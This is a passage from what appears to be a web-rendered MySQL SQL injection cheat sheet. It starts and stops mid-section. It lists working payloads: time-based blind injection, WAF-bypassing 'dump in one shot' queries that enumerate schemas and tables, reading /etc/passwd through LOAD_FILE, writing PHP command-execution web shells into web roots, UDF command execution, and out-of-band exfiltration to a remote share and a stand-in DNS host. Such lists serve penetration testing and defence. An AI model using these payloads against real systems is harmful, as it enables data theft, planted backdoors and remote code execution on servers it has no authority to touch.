</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">IF</span><span class="p">(</span><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">USER</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;=</span><span class="mi">100</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">2000000</span><span class="p">,</span><span class="n">MD5</span><span class="p">(</span><span class="n">NOW</span><span class="p">())))</span> <span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">IF</span><span class="p">(</span><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">USER</span><span class="p">()),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span><span class="o">&gt;=</span><span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">OR</span> <span class="n">IF</span><span class="p">(</span><span class="n">MID</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'5'</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'2
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-dios---dump-in-one-shot">MYSQL DIOS - Dump in One Shot</h2>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="k">select</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x00</span><span class="p">),(</span><span class="k">select</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span> <span class="k">where</span> <span class="p">(</span><span class="n">table_schema</span><span class="o">&gt;=@</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">in</span> <span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x0D</span><span class="p">,</span><span class="mi">0</span><span class="n">x0A</span><span class="p">,</span><span class="s1">' [ '</span><span class="p">,</span><span class="n">table_schema</span><span class="p">,</span><span class="s1">' ] &gt; '</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="s1">' &gt; '</span><span class="p">,</span><span class="k">column_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">))))</span><span class="n">a</span><span class="p">)</span><span class="o">#</span>

<span class="p">(</span><span class="k">select</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x00</span><span class="p">),(</span><span class="k">select</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="n">db_data</span><span class="p">.</span><span class="n">table_data</span><span class="p">)</span> <span class="k">where</span> <span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">in</span> <span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x0D</span><span class="p">,</span><span class="mi">0</span><span class="n">x0A</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">,</span><span class="s1">' [ '</span><span class="p">,</span><span class="n">column_data1</span><span class="p">,</span><span class="s1">' ] &gt; '</span><span class="p">,</span><span class="n">column_data2</span><span class="p">,</span><span class="s1">' &gt; '</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">))))</span><span class="n">a</span><span class="p">)</span><span class="o">#</span>

<span class="c1">-- SecurityIdiots</span>
<span class="n">make_set</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">make_set</span><span class="p">(</span><span class="mi">511</span><span class="p">,</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c6c693e</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="k">column_name</span><span class="p">)),</span><span class="o">@</span><span class="p">)</span>

<span class="c1">-- Profexer</span>
<span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x00</span><span class="p">),(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">in</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3C62723E</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="k">column_name</span><span class="p">))))</span><span class="n">a</span><span class="p">)</span>

<span class="c1">-- Dr.Z3r0</span>
<span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">xa7</span><span class="p">,(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c6c693e</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="k">column_name</span><span class="p">))),</span><span class="o">@</span><span class="p">))</span>

<span class="c1">-- M@dBl00d</span>
<span class="p">(</span><span class="k">Select</span> <span class="n">export_set</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="p">,(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">export_set</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">export_set</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="o">@</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c6c693e</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span><span class="k">column_name</span><span class="p">,</span><span class="mi">0</span><span class="n">xa3a</span><span class="p">,</span><span class="mi">2</span><span class="p">)),</span><span class="o">@</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>

<span class="c1">-- Zen</span>
<span class="o">+</span><span class="n">make_set</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="p">)</span><span class="k">where</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">make_set</span><span class="p">(</span><span class="mi">511</span><span class="p">,</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c6c693e</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="k">column_name</span><span class="p">)),</span><span class="o">@</span><span class="p">)</span>

<span class="c1">-- Zen WAF</span>
<span class="p">(</span><span class="cm">/*!12345sELecT*/</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="cm">/*!12345sELecT*/</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x00</span><span class="p">),(</span><span class="cm">/*!12345sELecT*/</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="nv">`InFoRMAtiON_sCHeMa`</span><span class="p">.</span><span class="nv">`ColUMNs`</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="nv">`TAblE_sCHemA`</span><span class="o">=</span><span class="k">DatAbAsE</span><span class="cm">/*data*/</span><span class="p">())</span><span class="k">and</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">in</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">CoNCat</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c62723e5461626c6520466f756e64203a20</span><span class="p">,</span><span class="k">TaBLe_nAMe</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a3a</span><span class="p">,</span><span class="k">column_name</span><span class="p">))))</span><span class="n">a</span><span class="p">)</span>

<span class="c1">-- ~tr0jAn WAF</span>
<span class="o">+</span><span class="n">concat</span><span class="cm">/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+

-- ~tr0jAn Benchmark
+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+

-- N1Z4M WAF
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+

-- sharik
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-current-queries">MYSQL Current queries</h2>

<p>This table can list all operations that DB is performing at the moment.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">union</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="k">state</span><span class="p">,</span><span class="n">info</span><span class="p">,</span><span class="mi">4</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">PROCESSLIST</span> <span class="o">#</span>

<span class="c1">-- Dump in one shot example for the table content.</span>
<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x00</span><span class="p">),(</span><span class="k">select</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">processlist</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="o">@</span><span class="p">)</span><span class="k">in</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="o">@</span><span class="p">,</span><span class="mi">0</span><span class="n">x3C62723E</span><span class="p">,</span><span class="k">state</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">info</span><span class="p">))))</span><span class="n">a</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span> <span class="o">#</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-read-content-of-a-file">MYSQL Read content of a file</h2>

<p>Need the <code class="language-plaintext highlighter-rouge">filepriv</code>, otherwise you will get the error : <code class="language-plaintext highlighter-rouge">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s1">' UNION ALL SELECT LOAD_FILE('</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">') --
</span></pre></td></tr></tbody></table></code></div></div>

<p>If you are <code class="language-plaintext highlighter-rouge">root</code> on the database, you can re-enable the <code class="language-plaintext highlighter-rouge">LOAD_FILE</code> using the following query</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">GRANT</span> <span class="n">FILE</span> <span class="k">ON</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'root'</span><span class="o">@</span><span class="s1">'localhost'</span><span class="p">;</span> <span class="n">FLUSH</span> <span class="k">PRIVILEGES</span><span class="p">;</span><span class="o">#</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-write-a-shell">MYSQL Write a shell</h2>

<h3 id="into-outfile-method">Into outfile method</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">[...]</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="nv">"&lt;?php system($_GET['cmd']); ?&gt;"</span> <span class="k">into</span> <span class="n">outfile</span> <span class="nv">"C:</span><span class="se">\\</span><span class="nv">xampp</span><span class="se">\\</span><span class="nv">htdocs</span><span class="se">\\</span><span class="nv">backdoor.php"</span>
<span class="p">[...]</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="s1">''</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'/var/www/html/x.php'</span> <span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">'&lt;?php phpinfo();?&gt;'</span>
<span class="p">[...]</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c3f70687020706870696e666f28293b203f3e</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">wamp</span><span class="se">\\</span><span class="s1">www</span><span class="se">\\</span><span class="s1">pwnd.php'</span><span class="c1">-- -</span>
<span class="p">[...]</span> <span class="k">union</span> <span class="k">all</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nv">"&lt;?php echo shell_exec($_GET['cmd']);?&gt;"</span><span class="p">,</span><span class="mi">6</span> <span class="k">into</span> <span class="n">OUTFILE</span> <span class="s1">'c:/inetpub/wwwroot/backdoor.php'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="into-dumpfile-method">Into dumpfile method</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="p">[...]</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">0</span><span class="n">xPHP_PAYLOAD_IN_HEX</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span> <span class="k">INTO</span> <span class="n">DUMPILE</span> <span class="s1">'C:/Program Files/EasyPHP-12.1/www/shell.php'</span>
<span class="p">[...]</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">0</span><span class="n">x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e</span> <span class="k">INTO</span> <span class="n">DUMPFILE</span> <span class="s1">'/var/www/html/images/shell.php'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-truncation">MYSQL Truncation</h2>

<p>In MYSQL “<code class="language-plaintext highlighter-rouge">admin </code>” and “<code class="language-plaintext highlighter-rouge">admin</code>” are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">`username`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Payload: <code class="language-plaintext highlighter-rouge">username = "admin               a"</code></p>

<h2 id="mysql-fast-exploitation">MYSQL Fast Exploitation</h2>

<p>Requirement: <code class="language-plaintext highlighter-rouge">MySQL &gt;= 5.7.22</code></p>

<p>Use <code class="language-plaintext highlighter-rouge">json_arrayagg()</code> instead of <code class="language-plaintext highlighter-rouge">group_concat()</code> which allows less symbols to be displayed</p>
<ul>
  <li>group_concat() = 1024 symbols</li>
  <li>json_arrayagg() &gt; 16,000,000 symbols</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">json_arrayagg</span><span class="p">(</span><span class="n">concat_ws</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">table_schema</span><span class="p">,</span><span class="k">table_name</span><span class="p">))</span> <span class="k">from</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-udf-command-execution">MYSQL UDF command execution</h2>

<p>First you need to check if the UDF are installed on the server.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">whereis</span><span class="w"> </span><span class="nx">lib_mysqludf_sys.so</span><span class="w">
</span><span class="n">/usr/lib/lib_mysqludf_sys.so</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Then you can use functions such as <code class="language-plaintext highlighter-rouge">sys_exec</code> and <code class="language-plaintext highlighter-rouge">sys_eval</code>.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">p</span> <span class="n">mysql</span>
<span class="n">Enter</span> <span class="n">password</span><span class="p">:</span> <span class="p">[...]</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">sys_eval</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
<span class="o">+</span><span class="c1">--------------------------------------------------+</span>
<span class="o">|</span> <span class="n">sys_eval</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------------------------------------+</span>
<span class="o">|</span> <span class="n">uid</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">mysql</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">128</span><span class="p">(</span><span class="n">mysql</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">128</span><span class="p">(</span><span class="n">mysql</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------------------------------------+</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-out-of-band">MYSQL Out of band</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">select</span><span class="w"> </span><span class="err">@@</span><span class="nx">version</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">outfile</span><span class="w"> </span><span class="s1">'\\\\192.168.0.100\\temp\\out.txt'</span><span class="p">;</span><span class="w">
</span><span class="n">select</span><span class="w"> </span><span class="err">@@</span><span class="nx">version</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">dumpfile</span><span class="w"> </span><span class="s1">'\\\\192.168.0.100\\temp\\out.txt
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="dns-exfiltration">DNS exfiltration</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="s1">'</span><span class="se">\\\\</span><span class="s1">'</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="s1">'.hacker.site</span><span class="se">\\</span><span class="s1">a.txt'</span><span class="p">));</span>
<span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c5c5c5c</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x2e6861636b65722e736974655c5c612e747874</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="unc-path---ntlm-hash-stealing">UNC Path - NTLM hash stealing</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
